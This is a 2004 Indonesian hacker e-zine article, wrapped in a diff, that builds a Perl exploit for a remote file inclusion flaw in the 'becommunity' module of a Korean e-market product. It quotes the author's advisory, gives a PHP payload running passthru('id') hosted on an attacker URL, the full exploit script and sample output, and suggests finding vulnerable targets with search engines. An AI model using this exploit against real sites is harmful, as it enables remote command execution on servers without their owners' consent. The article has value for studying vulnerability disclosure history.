@@ -1,0 +1,226 @@
+       
+
+        ____________________   ___ ___ ________   
+ 	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       08
+
+Author: y3dips || y3dips@echo.or.id 
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+== Remote Command Execution EXPLOIT for Becommunity (Testing Only) ==
+
+Pengantar
+---------
+
+Salam Berbagi, kali ini aku cuma coba coba membuatkan exploit untuk advisories
+yang aku buat dengan script perl, ini cuma buat latihan ( biar gak lupa perl)
+sekaligus memudahkan mengecek tanpa perlu browser, oh iya exploit ini juga cuma 
+buat testing, alias gak bisa langsung pake (takut berbahaya)
+
+Kalo temen temen yang ngerti programing n bisa meraciknya , maka script ini
+dapat di buat berbahaya dan dapat digunakan untuk metode injection lainnya
+alias tidak hanya untuk "becommunity" ini :)
+
+Terakhir dari aku, semoga ini bermanfaat dan dapat digunakan sebaik baiknya untuk
+pembelajaran bersama
+
+
+C0re
+----
+
+Berikut potongan Advisories yang aku buat dan telah aku post ke berbagai situs
+security dan juga di publish di echo.or.id
+
+
+--[snip]--
+
+/*taken from http://echo.or.id/adv/adv06-y3dips-2004.txt
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+E-market is commercial software made by korean company, includes shopping mall, 
+community , e-crm (e-customer relationship management) , group buying ,weblog, 
+auction, estimate sheet , and other features
+
+web : http://www.nt.co.kr
+      http://www.bbs2000.co.kr
+
+Risk: very high ( ***** )
+      most off all korean sites that handle e-shop , e-banking,... use this
+      d**n software
+
+else, no more info could get cause the site in korean language :(
+
+---------------------------------------------------------------------------
+
+
+Vulnerabilities:
+~~~~~~~~~~~~~~~~
+
+Remote command execution on 'becommunity' (modules that support by BBS e-market
+professional)  makes insecure calls to the include() function of PHP (works 
+on " pageurl= " functions )  which can allow the inclusion of remote files, 
+and thereby the execution of arbitrary commands by remote user with  the web 
+server user permissions, usually 'nobody' .
+
+
+http://[TARGET]/becommunity/community/index.php?pageurl=[injection URL]
+
+--[snip]--
+
+
+
+C0ding Time
+-----------
+
+Yupe, sekarang mari kita racik exploitnya, pertama tama karena ini metode injection
+maka kita tetap harus menyiapkan script php di url lain yang akan di eksekusi oleh
+webserver target nantinya.
+
+kita buat dulu file tes.txt yang isinya kurang lebih seperti ini
+
+-- cut --
+
+<?
+echo "".passthru(' id ')."";
+?>
+
+-- cut --
+
+simpan di situs yang anda miliki sehingga URL yang kita dapat adalah 
+http://www.attacker.com/tes.txt
+
+sekarang kita buat scriptnya,
+
+--------------------------------------xplo.pl-------------------------------
+
+#!/usr/bin/perl -w
+ 
+# Remote Testing becommunity by y3dips [for testing only]
+# Bug find by y3dips , published at http://echo.or.id/adv/adv06-y3dips-2004.txt
+
+print "  * Remote Testing becommunity by y3dips *\n";
+
+require LWP::UserAgent;
+
+if(@ARGV == 2)
+	{
+      
+$target= $ARGV[0];   #ambil inputan url target , eg : www.target.com
+$xploit= $ARGV[1];   #ambil inputan url exploit ,eg:www.attacker.com/tes.txt
+
+my $ua = LWP::UserAgent->new;
+$ua->agent("MSIE/6.0 Windows");
+$ua->timeout(10);
+$ua->env_proxy;
+
+$url = "http://$target/becommunity/community/index.php?pageurl=$xploit";
+
+my $injek = $ua->get($url); 
+
+	print "---------------------------------------------------\n";
+
+	if ($injek->is_success) 
+		{ print ("    $target Sepertinya Vulnerable\n");       } 
+	else 	{ print ("    $target Sepertinya Tidak Vulnerable\n"); }
+
+	print "---------------------------------------------------\n";
+
+	}
+
+else{
+print "Gunakan: perl $0 [www.target] [xplo.txt]  \n"; #Help options
+}  
+
+
+#EOF y3dips(c)2004
+
+-----------------------------------------eof--------------------------------
+
+Sekarang kita coba jalankan exploitnya , sengaja aku cobakan di windows XP, 
+dengan harapan teman teman lebih mudah menggunakannya (cukup gunakan Active
+State Perl)
+
+Mari kita mulai,
+
+	Microsoft Windows XP [Version 5.1.2600]
+	(C) Copyright 1985-2001 Microsoft Corp.
+
+	C:\Documents and Settings\y3dips>f:
+
+	F:\>perl xplo.pl
+	  * Remote Testing becommunity by y3dips *
+	Gunakan: perl xplo.pl [www.target] [xplo.txt]
+
+Apabila ternyata gagal maka akan menampilkan,
+
+	F:\>perl Xplo.pl www.dudul.com www.attacker.com/tes.txt
+  	* Remote Testing becommunity by y3dips *
+	---------------------------------------------------
+	    www.dudul.com Sepertinya Tidak Vulnerable
+	---------------------------------------------------
+
+
+Sedangkan jika berhasil,
+
+
+	F:\>perl Xplo.pl www.target.com www.attacker.com/tes.txt
+  	* Remote Testing becommunity by y3dips *
+	---------------------------------------------------
+	    www.target.com Sepertinya Vulnerable
+	---------------------------------------------------
+
+berarti www.target.com kemungkinan besar masih bisa kita injeksi ^_*
+
+
+Oh iya , untuk target silakan gunakan search engine :) , soalnya kalo sekalian
+dilengkapi google bisa panjang banget, yang penting kan maksudnya ngerti (hehe
+padahal aku aja yang males)
+Oh ya, kalo anda berfikir kita kudu cari di google dulu, itukan pake browser 
+juga, kenapa gak sekalian aja injek via url (hehehe, kamu benar :D) tetapi
+kan tujuan kita belajar bikin exploits :) (pinter banget nge-lesnya kayak tukang
+bajaj*, hue hue) 
+
+*mungkin target yang vulnerable sudah sangat sedikit sekali dikarenakan advisories
+ini sudah di publish pada awal september ke situs2 security (Eg:securityfocus.com)
+sehingga kalo banyak yang gagal bukan kesalahan scriptnya, tetapi memang sudah 
+di patch semua, dan pula artikel ini bukan untuk mencari yang vulnerable tetapi
+agar teman teman dapat menyerap ilmunya :)
+
+
+Penutup
+-------
+
+Semoga Artikel sederhana ini dapat menjadi berguna bagi kita semuanya, jika 
+ada kata kata yang salah,aku minta maaf, pada ALLAH aku mohon ampun.
+
+
+REference
+---------
+
+[1]. http://echo.or.id/adv/adv06-y3dips-2004.txt , Becommunity Example
+[2]. e-book perl yang aku donlod gratis dan memberi banyak ilmu :
+     - Advanced Perl programing
+     - Learning Perl the HArd Way
+     - Perl Programmer Reference Guide
+     - Picking Up perl
+[3]. Contoh script perl dari temen temen yang dah jago jago :)
+
+*greetz to: 
+	[echostaff : moby, comex, the_Day, z3r0byt3, K-159, c-a-s-e, S'to] 
+        {ISICteam : yudhax, anton, balai_melayu, wisnu, biatch-X },
+
+        anak anak newbie_hacker[at]yahoogroups.com , #e-c-h-o , #aikmel
+	
+	kirimkan kritik && saran ke y3dips[at]echo.or.id
+
+	*/0x79/0x33/0x64/0x69/0x70/0x73/* (c)2004
